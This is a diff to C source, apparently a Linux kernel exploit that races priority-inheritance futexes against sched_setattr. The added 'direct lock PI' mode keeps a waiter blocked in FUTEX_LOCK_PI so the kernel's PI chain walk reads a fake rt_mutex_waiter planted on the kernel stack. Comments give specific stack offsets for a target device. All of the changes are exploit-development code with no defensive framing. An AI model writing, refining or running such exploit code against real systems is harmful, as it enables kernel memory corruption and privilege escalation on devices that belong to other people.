@@ -190,6 +190,7 @@ static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consumer_ready;
 static atomic_int slide_stack_write_window;
 static atomic_int slide_pselect_write_window;
+static atomic_int slide_writer_armed;
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
 static atomic_int slide_pselect_last_ret;
 static atomic_int slide_pselect_last_errno;
@@ -1632,6 +1633,11 @@ static void slide_sigreturn_stack_copy(void) {
   signal_info.si_code = SI_QUEUE;
   signal_info.si_pid = getpid();
   signal_info.si_uid = getuid();
+  /* Make sure SIGUSR2 is not blocked in this thread before queueing it;
+   * a blocked signal would stall rt_tgsigqueueinfo forever. */
+  sigset_t empty;
+  sigemptyset(&empty);
+  sigprocmask(SIG_SETMASK, &empty, NULL);
   int ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(), tid,
                          SIGUSR2, &signal_info);
   int saved_errno = errno;
@@ -1641,7 +1647,11 @@ static void slide_sigreturn_stack_copy(void) {
                                             memory_order_relaxed);
 
   if (ret == 0 && handler_done && handler_status == 1) {
+#if !(defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI)
     atomic_store(&slide_consume_go, 1);
+#else
+    (void)tid;
+#endif
     while (!atomic_load(&slide_consume_stop)) {
       __asm__ volatile("yield" ::: "memory");
     }
@@ -1791,7 +1801,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     char guard_wchan[64] = "<not-read>";
 #endif
     if (seq == 1) {
-#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL && \
+    !(defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI)
       ready_ok = slide_wait_for_pselect_blocked(
           tid, SLIDE_PSELECT_READY_TIMEOUT_USEC,
           SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &ready_elapsed_usec,
@@ -1805,7 +1816,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       }
 #endif
       slide_wait_before_consume(seq);
-#if defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
+#if defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC) && \
+    !(defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI)
       uint64_t pselect_started_ns = atomic_load(&slide_pselect_started_ns);
       pselect_age_usec = pselect_started_ns
           ? (gettime_ns() - pselect_started_ns) / 1000ULL
@@ -1819,7 +1831,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
         return NULL;
       }
 #endif
-#if defined(SLIDE_GUARD_PSELECT_SYSCALL) && SLIDE_GUARD_PSELECT_SYSCALL
+#if defined(SLIDE_GUARD_PSELECT_SYSCALL) && SLIDE_GUARD_PSELECT_SYSCALL && \
+    !(defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI)
       guard_ok = slide_wait_for_pselect_blocked(
           tid, SLIDE_PSELECT_RECHECK_TIMEOUT_USEC,
           SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &guard_elapsed_usec,
@@ -1834,13 +1847,14 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 #endif
 #if defined(APP_PSELECT_POST_GUARD_AGE_CHECK) && \
     APP_PSELECT_POST_GUARD_AGE_CHECK && \
-    defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
+    defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC) && \
+    !(defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI)
       pselect_started_ns = atomic_load(&slide_pselect_started_ns);
       pselect_age_usec = pselect_started_ns
           ? (gettime_ns() - pselect_started_ns) / 1000ULL
           : UINT64_MAX;
       if (pselect_age_usec > APP_PSELECT_TRIGGER_MAX_AGE_USEC) {
-        pr_info("slide pselect post-guard age=0 tid=%d age_usec=%llu "
+        pr_info("slide pselect post-guard age=0 tid=%ld age_usec=%llu "
                 "max=%d; trigger skipped\n",
                 tid, (unsigned long long)pselect_age_usec,
                 APP_PSELECT_TRIGGER_MAX_AGE_USEC);
@@ -1886,7 +1900,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 #endif
 
 #if defined(SLIDE_PSELECT_FINAL_GUARD) && SLIDE_PSELECT_FINAL_GUARD && \
-    defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+    defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL && \
+    !(defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI)
     /*
      * Point-blank re-verification immediately before sched_setattr.
      * The earlier ready/guard checks can pass and yet the waiter can leave
@@ -1918,7 +1933,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int entered = atomic_load(&slide_consume_enter_sched) + 1;
     atomic_store(&slide_consume_enter_sched, entered);
     atomic_store(&slide_consume_calls, calls + 1);
-#if defined(SLIDE_SKIP_UNREACHABLE_LOCK) && SLIDE_SKIP_UNREACHABLE_LOCK
+#if defined(SLIDE_SKIP_UNREACHABLE_LOCK) && SLIDE_SKIP_UNREACHABLE_LOCK && \
+    !(defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI)
     /*
      * A06 geometry: the walked futex rt_mutex_waiter (FUTEX_WAIT_REQUEUE_PI)
      * sits at task->stack + 0x3c80 with ->lock at +0x58 = 0x3cd8, which is
@@ -1941,6 +1957,15 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     }
 #endif
     *errno_ptr = 0;
+#if defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI
+    /*
+     * The waiter re-arms FUTEX_LOCK_PI until this flag is set.  Flip it
+     * immediately before sched_setattr so the waiter releases its block
+     * only AFTER the priority-inheritance walk has read the fake waiter;
+     * the futex block stays live across this window.
+     */
+    atomic_store(&slide_writer_armed, 1);
+#endif
     long ret = sched_setattr_tid(tid, (calls % 19) + 1);
     int saved_errno = *errno_ptr;
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
@@ -2003,20 +2028,48 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
    * slide_f_pi_target and is not waiting on anything else, so the waiter
    * blocks inside futex_lock_pi -> rt_mutex_slowlock with its
    * rt_mutex_waiter a couple of stack frames shallower than the
-   * FUTEX_WAIT_REQUEUE_PI path.  The fd_set copy window (0x3c20..0x3c90
-   * with nfds=320) can then overlap the waiter's ->lock at +0x38/+0x58,
-   * which the REQUEUE path's 0x3c80 base never allowed (lock at 0x3cd8 =
-   * index 23 > 14).  NOTE: the waiter must NOT hold slide_f_pi_chain
-   * here, otherwise the PI chain sees a cycle (owner holds target and
-   * waits for chain) and FUTEX_LOCK_PI returns EDEADLK without blocking.
+   * FUTEX_WAIT_REQUEUE_PI path.  NOTE: the waiter must NOT hold
+   * slide_f_pi_chain here, otherwise the PI chain sees a cycle (owner
+   * holds target and waits for chain) and FUTEX_LOCK_PI returns EDEADLK
+   * without blocking.
+   *
+   * The block must stay LIVE while the consumer fires sched_setattr
+   * (so task->pi_blocked_on is non-NULL and the priority-inheritance walk
+   * reads the fake waiter we are about to write).  Re-arm the
+   * FUTEX_LOCK_PI on a short timeout until the consumer flips
+   * slide_writer_armed, which it does immediately before sched_setattr.
    */
-  long wait_ret = futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, &timeout,
-                           NULL, 0);
+  long wait_ret = -1;
+  int wait_errno = ETIMEDOUT;
+  while (!atomic_load(&slide_writer_armed)) {
+    struct timespec looptimeout;
+    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &looptimeout));
+    looptimeout.tv_sec += SLIDE_WAIT_NSEC / 1000000000L;
+    looptimeout.tv_nsec += SLIDE_WAIT_NSEC % 1000000000L;
+    if (looptimeout.tv_nsec >= 1000000000L) {
+      looptimeout.tv_sec++;
+      looptimeout.tv_nsec -= 1000000000L;
+    }
+    errno = 0;
+    wait_ret = futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0,
+                        &looptimeout, NULL, 0);
+    wait_errno = errno;
+    if (wait_ret == 0) {
+      /* acquired -- owner must have released; nothing to walk */
+      atomic_store(&slide_route_done, 1);
+      return NULL;
+    }
+    if (wait_errno != ETIMEDOUT && wait_errno != EINTR &&
+        wait_errno != EAGAIN) {
+      break;
+    }
+    __asm__ volatile("yield" ::: "memory");
+  }
 #else
   long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                            &slide_f_pi_target, 0);
-#endif
   int wait_errno = errno;
+#endif
 #if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
   pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
 #endif
@@ -2283,10 +2336,12 @@ static int slide_child_trigger_write(void) {
 
 #if defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI
   /*
-   * Direct mode: waiter is blocked in FUTEX_LOCK_PI on slide_f_pi_target
-   * (held by owner).  Wait for its timeout, then let it proceed to the
-   * writer.
+   * Direct mode: waiter is in the FUTEX_LOCK_PI re-arm loop until
+   * slide_writer_armed is flipped by the consumer.  Arm the consumer
+   * now; the waiter stays blocked (pi_blocked_on live) while the
+   * consumer flips writer_armed and fires sched_setattr.
    */
+  atomic_store(&slide_consume_go, 1);
   while (!atomic_load(&slide_waiter_ok)) {
     usleep(1000);
   }
